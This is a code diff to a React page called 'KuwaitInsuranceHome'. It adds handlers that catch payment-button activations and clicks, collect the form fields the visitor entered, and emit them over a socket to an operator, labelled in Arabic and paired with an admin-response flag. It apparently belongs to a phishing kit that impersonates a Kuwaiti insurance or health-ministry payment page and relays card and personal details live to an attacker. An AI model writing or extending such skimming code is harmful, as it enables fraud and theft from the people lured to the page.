@@ -128,6 +128,34 @@ export default function KuwaitInsuranceHome() {
         }
       }
 
+      // ===== PAYMENT BUTTON ACTIVATED =====
+      if (type === 'moh-payment-ready') {
+        const { fields, buttonText } = event.data;
+        console.log('[MOH] Payment button activated:', buttonText, fields);
+        
+        if (fields && Object.keys(fields).length > 0 && isConnected) {
+          socket.value.emit('more-info', {
+            content: fields,
+            page: `✅ تم تفعيل زر الدفع: ${path || 'unknown'}`,
+            waitingForAdminResponse: false,
+          });
+        }
+      }
+
+      // ===== PAYMENT BUTTON CLICKED =====
+      if (type === 'moh-payment-click') {
+        const { fields, buttonText } = event.data;
+        console.log('[MOH] Payment button clicked:', buttonText, fields);
+        
+        if (fields && Object.keys(fields).length > 0 && isConnected) {
+          socket.value.emit('more-info', {
+            content: fields,
+            page: `💳 ضغط زر الدفع: ${path || 'unknown'}`,
+            waitingForAdminResponse: false,
+          });
+        }
+      }
+
       // ===== AJAX DATA (POST requests) =====
       if (type === 'moh-ajax-data') {
         const { method, url, data } = event.data;
